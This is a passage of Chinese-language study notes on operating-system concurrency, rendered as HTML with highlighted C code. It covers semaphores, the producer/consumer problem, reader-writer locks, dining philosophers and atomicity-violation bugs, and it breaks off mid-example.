id="用信号量做条件变量"><a href="#用信号量做条件变量" class="headerlink" title="用信号量做条件变量"></a>用信号量做条件变量</h2><p>初始值为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">sem_t</span> s;<br><span class="hljs-number">2</span><br><span class="hljs-number">3</span> <span class="hljs-type">void</span> *<br><span class="hljs-number">4</span> child(<span class="hljs-type">void</span> *arg) &#123;<br><span class="hljs-number">5</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child\n&quot;</span>);<br><span class="hljs-number">6</span> sem_post(&amp;s); <span class="hljs-comment">// signal here: child is done</span><br><span class="hljs-number">7</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">8</span> &#125;<br><span class="hljs-number">9</span><br><span class="hljs-number">10</span> <span class="hljs-type">int</span><br><span class="hljs-number">11</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[]) &#123;<br><span class="hljs-number">12</span> sem_init(&amp;s, <span class="hljs-number">0</span>, X); <span class="hljs-comment">// what should X be?</span><br><span class="hljs-number">13</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent: begin\n&quot;</span>);<br><span class="hljs-number">14</span> <span class="hljs-type">pthread_t</span> c;<br><span class="hljs-number">15</span> Pthread_create(c, <span class="hljs-literal">NULL</span>, child, <span class="hljs-literal">NULL</span>);<br><span class="hljs-number">16</span> sem_wait(&amp;s); <span class="hljs-comment">// wait here for child</span><br><span class="hljs-number">17</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent: end\n&quot;</span>);<br><span class="hljs-number">18</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">19</span> &#125; <br></code></pre></td></tr></table></figure><p>有两种情况需要考虑。第一种，父线程创建了子线程，但是子线程并没有运行。</p><ul><li>父线程调用 sem_wait()会先于子线程调用 sem_post()。</li><li>我们希望父线程等待子线程运行。</li><li>为此，唯一的办法是让信号量的值 不大于 0。因此，0 为初值。父线程运行，将信号量减为−1，然后睡眠等待</li><li>子线程运行的 时候，调用 sem_post()，信号量增加为 0，唤醒父线程，父线程然后从 sem_wait()返回，完 成该程序。</li></ul><p>第二种，子线程直接运行</p><ul><li>在这种情况下，子线程会先调用 sem_post()，将信号量从 0 增加到 1。</li><li>然后当父线程有机会运行时，会调用 sem_wait()，发现信号量的值为 1。</li><li>于是父线程将信号量从 1 减为 0，没有等待，直接从 sem_wait()返回，也达到了预期效果。</li></ul><h2 id="生产者-消费者（有界缓冲区）问题"><a href="#生产者-消费者（有界缓冲区）问题" class="headerlink" title="生产者/消费者（有界缓冲区）问题"></a>生产者/消费者（有界缓冲区）问题</h2><h3 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h3><p>第一次尝试解决该问题时，我们用两个信号量 empty 和 full 分别表示缓冲区空或者满。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">int</span> buffer[MAX];<br><span class="hljs-number">2</span> <span class="hljs-type">int</span> fill = <span class="hljs-number">0</span>;<br><span class="hljs-number">3</span> <span class="hljs-type">int</span> use = <span class="hljs-number">0</span>;<br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> <span class="hljs-type">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br><span class="hljs-number">6</span> buffer[fill] = value; <span class="hljs-comment">// line f1</span><br><span class="hljs-number">7</span> fill = (fill + <span class="hljs-number">1</span>) % MAX; <span class="hljs-comment">// line f2</span><br><span class="hljs-number">8</span> &#125;<br><span class="hljs-number">9</span><br><span class="hljs-number">10</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">11</span> <span class="hljs-type">int</span> tmp = buffer[use]; <span class="hljs-comment">// line g1</span><br><span class="hljs-number">12</span> use = (use + <span class="hljs-number">1</span>) % MAX; <span class="hljs-comment">// line g2</span><br><span class="hljs-number">13</span> <span class="hljs-keyword">return</span> tmp;<br><span class="hljs-number">14</span> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">sem_t</span> empty;<br><span class="hljs-number">2</span> <span class="hljs-type">sem_t</span> full;<br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">5</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">6</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">7</span> sem_wait(&amp;empty); <span class="hljs-comment">// line P1</span><br><span class="hljs-number">8</span> put(i); <span class="hljs-comment">// line P2</span><br><span class="hljs-number">9</span> sem_post(&amp;full); <span class="hljs-comment">// line P3</span><br><span class="hljs-number">10</span> &#125;<br><span class="hljs-number">11</span> &#125;<br><span class="hljs-number">12</span><br><span class="hljs-number">13</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">14</span> <span class="hljs-type">int</span> i, tmp = <span class="hljs-number">0</span>;<br><span class="hljs-number">15</span> <span class="hljs-keyword">while</span> (tmp != <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-number">16</span> sem_wait(&amp;full); <span class="hljs-comment">// line C1</span><br><span class="hljs-number">17</span> tmp = get(); <span class="hljs-comment">// line C2</span><br><span class="hljs-number">18</span> sem_post(&amp;empty); <span class="hljs-comment">// line C3</span><br><span class="hljs-number">19</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, tmp);<br><span class="hljs-number">20</span> &#125;<br><span class="hljs-number">21</span> &#125;<br><span class="hljs-number">22</span><br><span class="hljs-number">23</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br><span class="hljs-number">24</span> <span class="hljs-comment">// ...</span><br><span class="hljs-number">25</span> sem_init(&amp;empty, <span class="hljs-number">0</span>, MAX); <span class="hljs-comment">// MAX buffers are empty to begin with...</span><br><span class="hljs-number">26</span> sem_init(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// ... and 0 are full</span><br><span class="hljs-number">27</span> <span class="hljs-comment">// ...</span><br><span class="hljs-number">28</span> &#125;<br></code></pre></td></tr></table></figure><p>本例中，生产者等待缓冲区为空，然后加入数据。类似地，消费者等待缓冲区变成有数据的状态，然后取走数据。我们先假设 MAX=1（数组中只有一个缓冲区），验证程序是否有效。</p><p>假设有两个线程，一个生产者和一个消费者。我们来看在一个 CPU 上的具体场景。消费者先运行，执行到 C1 行，调用 sem_wait(&amp;full)。因为 full 初始值为 0，wait 调用会将 full 减为−1，导致消费者睡眠，等待另一个线程调用 sem_post(&amp;full)，符合预期。</p><p>假设生产者然后运行。执行到 P1 行，调用 sem_wait(&amp;empty)。不像消费者，生产者将继续执行，因为 empty 被初始化为 MAX（在这里是 1）。因此，empty 被减为 0，生产者向缓冲区中加入数据，然后执行 P3 行，调用 sem_post(&amp;full)，把 full 从−1 变成 0，唤醒消费者（即将它从阻塞变成就续）。</p><p>在这种情况下，可能会有两种情况。如果生产者继续执行，再次循环到 P1 行，由于 empty 值为 0，它会阻塞。如果生产者被中断，而消费者开始执行，调用 sem_wait(&amp;full)（c1 行）， 发现缓冲区确实满了，消费它。这两种情况都是符合预期的。</p><p>你可以用更多的线程来尝试这个例子（即多个生产者和多个消费者）。它应该仍然<strong>正常运行</strong>。</p><p>我们现在假设 MAX 大于 1（比如 MAX=10）。对于这个例子，假定有多个生产者，多个消费者。现在就有问题了：<strong>竞态条件</strong>。</p><p>假设两个生产者（Pa 和 Pb）几乎同时调用 put()。当 Pa 先运 行，在 f1 行先加入第一条数据（fill=0），假设 Pa 在将 fill 计数器更新为 1 之前被中断，Pb 开始运行，也在 f1 行给缓冲区的 0 位置加入一条数据，这意味着那里的老数据被覆盖！这 可不行，我们不能让生产者的数据丢失。</p><p><strong>就是说，锁的约束性不够了！</strong></p><p>哪怕都能写，但是写的位置是相同的，这个是不行的。</p><h3 id="解决方案：增加互斥"><a href="#解决方案：增加互斥" class="headerlink" title="解决方案：增加互斥"></a>解决方案：增加互斥</h3><p>为<strong>写入</strong>这个操作，再加一个锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">5</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">6</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">7</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">8</span> sem_wait(&amp;mutex); <span class="hljs-comment">// line p0 (NEW LINE)</span><br><span class="hljs-number">9</span> sem_wait(&amp;empty); <span class="hljs-comment">// line p1</span><br><span class="hljs-number">10</span> put(i); <span class="hljs-comment">// line p2</span><br><span class="hljs-number">11</span> sem_post(&amp;full); <span class="hljs-comment">// line p3</span><br><span class="hljs-number">12</span> sem_post(&amp;mutex); <span class="hljs-comment">// line p4 (NEW LINE)</span><br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span> &#125;<br><span class="hljs-number">15</span><br><span class="hljs-number">16</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">17</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">18</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">19</span> sem_wait(&amp;mutex); <span class="hljs-comment">// line c0 (NEW LINE)</span><br><span class="hljs-number">20</span> sem_wait(&amp;full); <span class="hljs-comment">// line c1</span><br><span class="hljs-number">21</span> <span class="hljs-type">int</span> tmp = get(); <span class="hljs-comment">// line c2</span><br><span class="hljs-number">22</span> sem_post(&amp;empty); <span class="hljs-comment">// line c3</span><br><span class="hljs-number">23</span> sem_post(&amp;mutex); <span class="hljs-comment">// line c4 (NEW LINE)</span><br><span class="hljs-number">24</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, tmp);<br><span class="hljs-number">25</span> &#125;<br><span class="hljs-number">26</span> &#125;<br></code></pre></td></tr></table></figure><p>同时只能有一个生产者进行写入。</p><h3 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h3><p>消 费者首先运行，获得锁（c0 行），然后对 full 信号量执行 sem_wait() （c1 行）。因为还没有 数据，所以消费者阻塞，让出 CPU。但是，重要的是，此时消费者仍然持有锁。</p><p>然后生产者运行。假如生产者能够运行，它就能生产数据并唤醒消费者线程。遗憾的是， 它首先对二值互斥信号量调用 sem_wait()（p0 行）。锁已经被持有，因此生产者也被卡住。</p><h3 id="解决方案：紧邻临界区"><a href="#解决方案：紧邻临界区" class="headerlink" title="解决方案：紧邻临界区"></a>解决方案：紧邻临界区</h3><p>把获取和释放互斥量的操作调整为紧挨着临界区，把 full、empty 的唤醒和等待操作调整到锁 外面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">sem_t</span> empty;<br><span class="hljs-number">2</span> <span class="hljs-type">sem_t</span> full;<br><span class="hljs-number">3</span> <span class="hljs-type">sem_t</span> mutex;<br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">6</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">7</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">8</span> sem_wait(&amp;empty); <span class="hljs-comment">// line p1</span><br><span class="hljs-number">9</span> sem_wait(&amp;mutex); <span class="hljs-comment">// line p1.5 (MOVED MUTEX HERE...)</span><br><span class="hljs-number">10</span> put(i); <span class="hljs-comment">// line p2</span><br><span class="hljs-number">11</span> sem_post(&amp;mutex); <span class="hljs-comment">// line p2.5 (... AND HERE)</span><br><span class="hljs-number">12</span> sem_post(&amp;full); <span class="hljs-comment">// line p3</span><br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span> &#125;<br><span class="hljs-number">15</span><br><span class="hljs-number">16</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">17</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">18</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">19</span> sem_wait(&amp;full); <span class="hljs-comment">// line c1</span><br><span class="hljs-number">20</span> sem_wait(&amp;mutex); <span class="hljs-comment">// line c1.5 (MOVED MUTEX HERE...)</span><br><span class="hljs-number">21</span> <span class="hljs-type">int</span> tmp = get(); <span class="hljs-comment">// line c2</span><br><span class="hljs-number">22</span> sem_post(&amp;mutex); <span class="hljs-comment">// line c2.5 (... AND HERE)</span><br><span class="hljs-number">23</span> sem_post(&amp;empty); <span class="hljs-comment">// line c3</span><br><span class="hljs-number">24</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, tmp);<br><span class="hljs-number">25</span> &#125;<br><span class="hljs-number">26</span> &#125;<br><span class="hljs-number">27</span><br><span class="hljs-number">28</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br><span class="hljs-number">29</span> <span class="hljs-comment">// ...</span><br><span class="hljs-number">30</span> sem_init(&amp;empty, <span class="hljs-number">0</span>, MAX); <span class="hljs-comment">// MAX buffers are empty to begin with...</span><br><span class="hljs-number">31</span> sem_init(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// ... and 0 are full</span><br><span class="hljs-number">32</span> sem_init(&amp;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// mutex=1 because it is a lock</span><br><span class="hljs-number">33</span> <span class="hljs-comment">// ...</span><br><span class="hljs-number">34</span> &#125; <br></code></pre></td></tr></table></figure><h2 id="读者-写者锁"><a href="#读者-写者锁" class="headerlink" title="读者-写者锁"></a>读者-写者锁</h2><p><strong>读者—写者锁（reader-writer lock）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">rwlock_t</span> &#123;</span><br><span class="hljs-number">2</span> <span class="hljs-type">sem_t</span> lock; <span class="hljs-comment">// binary semaphore (basic lock)</span><br><span class="hljs-number">3</span> <span class="hljs-type">sem_t</span> writelock; <span class="hljs-comment">// used to allow ONE writer or MANY readers</span><br><span class="hljs-number">4</span> <span class="hljs-type">int</span> readers; <span class="hljs-comment">// count of readers reading in critical section</span><br><span class="hljs-number">5</span> &#125; <span class="hljs-type">rwlock_t</span>;<br><span class="hljs-number">6</span><br><span class="hljs-number">7</span> <span class="hljs-type">void</span> <span class="hljs-title function_">rwlock_init</span><span class="hljs-params">(<span class="hljs-type">rwlock_t</span> *rw)</span> &#123;<br><span class="hljs-number">8</span> rw-&gt;readers = <span class="hljs-number">0</span>;<br><span class="hljs-number">9</span> sem_init(&amp;rw-&gt;lock, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br><span class="hljs-number">10</span> sem_init(&amp;rw-&gt;writelock, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br><span class="hljs-number">11</span> &#125;<br><span class="hljs-number">12</span><br><span class="hljs-number">13</span> <span class="hljs-type">void</span> <span class="hljs-title function_">rwlock_acquire_readlock</span><span class="hljs-params">(<span class="hljs-type">rwlock_t</span> *rw)</span> &#123;<br><span class="hljs-number">14</span> sem_wait(&amp;rw-&gt;lock);<br><span class="hljs-number">15</span> rw-&gt;readers++;<br><span class="hljs-number">16</span> <span class="hljs-keyword">if</span> (rw-&gt;readers == <span class="hljs-number">1</span>)<br><span class="hljs-number">17</span> sem_wait(&amp;rw-&gt;writelock); <span class="hljs-comment">// first reader acquires writelock</span><br><span class="hljs-number">18</span> sem_post(&amp;rw-&gt;lock);<br><span class="hljs-number">19</span> &#125;<br><span class="hljs-number">20</span><br><span class="hljs-number">21</span> <span class="hljs-type">void</span> <span class="hljs-title function_">rwlock_release_readlock</span><span class="hljs-params">(<span class="hljs-type">rwlock_t</span> *rw)</span> &#123;<br><span class="hljs-number">22</span> sem_wait(&amp;rw-&gt;lock);<br><span class="hljs-number">23</span> rw-&gt;readers--;<br><span class="hljs-number">24</span> <span class="hljs-keyword">if</span> (rw-&gt;readers == <span class="hljs-number">0</span>)<br><span class="hljs-number">25</span> sem_post(&amp;rw-&gt;writelock); <span class="hljs-comment">// last reader releases writelock</span><br><span class="hljs-number">26</span> sem_post(&amp;rw-&gt;lock);<br><span class="hljs-number">27</span> &#125;<br><span class="hljs-number">28</span><br><span class="hljs-number">29</span> <span class="hljs-type">void</span> <span class="hljs-title function_">rwlock_acquire_writelock</span><span class="hljs-params">(<span class="hljs-type">rwlock_t</span> *rw)</span> &#123;<br><span class="hljs-number">30</span> sem_wait(&amp;rw-&gt;writelock);<br><span class="hljs-number">31</span> &#125;<br><span class="hljs-number">32</span><br><span class="hljs-number">33</span> <span class="hljs-type">void</span> <span class="hljs-title function_">rwlock_release_writelock</span><span class="hljs-params">(<span class="hljs-type">rwlock_t</span> *rw)</span> &#123;<br><span class="hljs-number">34</span> sem_post(&amp;rw-&gt;writelock);<br><span class="hljs-number">35</span> &#125; <br></code></pre></td></tr></table></figure><h2 id="哲学家就餐问题"><a href="#哲学家就餐问题" class="headerlink" title="哲学家就餐问题"></a>哲学家就餐问题</h2><ul><li>Dijkstra 提出的有名问题；</li><li>假定 有 5 位“哲学家”围着一个圆桌。每两位哲学家之间有一把餐叉（一共 5 把）。哲学家有时要思考一会，不需要餐叉；有时又要就餐。而一位哲学家只有同时拿到了左手边和右手边的两把餐叉，才能吃到东西。</li></ul><p><img src="/2023/03/23/Operating-Systems/p22.png"></p><p>哲学家基本循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    think();<br>    getforks();<br>    eat();<br>    putforks();<br>&#125;<br></code></pre></td></tr></table></figure><p>关键的挑战就是如何实现 getforks()和 putforks()函数，保证没有死锁，没有哲学家饿死，并且并发度更高（尽可能让更多哲学家同时吃东西）。</p><p>辅助函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">left</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span> &#123; <span class="hljs-keyword">return</span> p; &#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span> &#123; <span class="hljs-keyword">return</span> (p + <span class="hljs-number">1</span>) % <span class="hljs-number">5</span>; &#125;<br></code></pre></td></tr></table></figure><p>用于获取左手、右手边的叉子；</p><p><strong>可能的死锁</strong>：所有人都占用了左边的叉子。</p><p><strong>解决方案</strong>：令某一位的取叉顺序改变一下即可。（先右后左或相反）</p><h2 id="用锁和条件变量实现信号量"><a href="#用锁和条件变量实现信号量" class="headerlink" title="用锁和条件变量实现信号量"></a>用锁和条件变量实现信号量</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">Zem_t</span> &#123;</span><br><span class="hljs-number">2</span> <span class="hljs-type">int</span> value;<br><span class="hljs-number">3</span> <span class="hljs-type">pthread_cond_t</span> cond;<br><span class="hljs-number">4</span> <span class="hljs-type">pthread_mutex_t</span> lock;<br><span class="hljs-number">5</span> &#125; Zem_t;<br><span class="hljs-number">6</span><br><span class="hljs-number">7</span> <span class="hljs-comment">// only one thread can call this</span><br><span class="hljs-number">8</span> <span class="hljs-type">void</span> <span class="hljs-title function_">Zem_init</span><span class="hljs-params">(Zem_t *s, <span class="hljs-type">int</span> value)</span> &#123;<br><span class="hljs-number">9</span> s-&gt;value = value;<br><span class="hljs-number">10</span> Cond_init(&amp;s-&gt;cond);<br><span class="hljs-number">11</span> Mutex_init(&amp;s-&gt;lock);<br><span class="hljs-number">12</span> &#125;<br><span class="hljs-number">13</span><br><span class="hljs-number">14</span> <span class="hljs-type">void</span> <span class="hljs-title function_">Zem_wait</span><span class="hljs-params">(Zem_t *s)</span> &#123;<br><span class="hljs-number">15</span> Mutex_lock(&amp;s-&gt;lock);<br><span class="hljs-number">16</span> <span class="hljs-keyword">while</span> (s-&gt;value &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-number">17</span> Cond_wait(&amp;s-&gt;cond, &amp;s-&gt;lock);<br><span class="hljs-number">18</span> s-&gt;value--;<br><span class="hljs-number">19</span> Mutex_unlock(&amp;s-&gt;lock);<br><span class="hljs-number">20</span> &#125;<br><span class="hljs-number">21</span><br><span class="hljs-number">22</span> <span class="hljs-type">void</span> <span class="hljs-title function_">Zem_post</span><span class="hljs-params">(Zem_t *s)</span> &#123;<br><span class="hljs-number">23</span> Mutex_lock(&amp;s-&gt;lock);<br><span class="hljs-number">24</span> s-&gt;value++;<br><span class="hljs-number">25</span> Cond_signal(&amp;s-&gt;cond);<br><span class="hljs-number">26</span> Mutex_unlock(&amp;s-&gt;lock);<br><span class="hljs-number">27</span> &#125;<br></code></pre></td></tr></table></figure><h1 id="第-32-章-常见并发问题"><a href="#第-32-章-常见并发问题" class="headerlink" title="第 32 章 常见并发问题"></a>第 32 章 常见并发问题</h1><h2 id="非死锁"><a href="#非死锁" class="headerlink" title="非死锁"></a>非死锁</h2><h3 id="违反原子性缺陷"><a href="#违反原子性缺陷" class="headerlink" title="违反原子性缺陷"></a>违反原子性缺陷</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> Thread <span class="hljs-number">1</span>::<br><span class="hljs-number">2</span> <span class="hljs-keyword">if</span> (thd-&gt;proc_info) &#123;<br><span class="hljs-number">3</span> ...<br><span class="hljs-number">4</span> <span class="hljs-built_in">fputs</span>(thd-&gt;proc_info, ...);<br><span class="hljs-number">5</span> ...<br><span class="hljs-number">6</span> &#125;<br><span class="hljs-number">7</span><br><span class="hljs-number">8</span> Thread <span class="hljs-number">2</span>::<br><span class="hljs-number">9</span> thd-&gt;proc_info = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>如上例</p><p>两个线程都要访问 thd 结构中的成员 proc_info。第一个线程检查 proc_info 非空，然后打印出值；第二个线程设置其为空。显然，当第一个线程检查之后，在 fputs() 调用之前被中断，第二个线程把指针置为空；当第一个线程恢复执行时，由于引用空指针， 导致程序奔溃。</p><p><strong>解决方法</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">pthread_mutex_t</span> proc_info_lock = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-number">2</span><br><span class="hljs-number">3</span> Thread <span class="hljs-number">1</span>::<br><span class="hljs-number">4</span> pthread_mutex_lock(&amp;proc_info_lock);<br><span class="hljs-number">5</span> <span class="hljs-keyword">if</span> (thd-&gt;proc_info) &#123;<br><span class="hljs-number">6</span> ...<br><span class="hljs-number">7</span> <span class="hljs-built_in">fputs</span>(thd-&gt;proc_info, ...);<br><span class="hljs-number">8</span> ...<br><span class="hljs-number">9</span> &#125;<br><span class="hljs-number">10</span> pthread_mutex_unlock(&amp;proc_info_lock);<br><span class="hljs-number">11</span><br><span class="hljs-number">12</span> Thread <span class="hljs-number">2</span>::<br><span class="hljs-number">13</span> pthread_mutex_lock(&amp;proc_info_lock);<br><span class="hljs-number">14</span> thd-&gt;proc_info = <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">15</span> 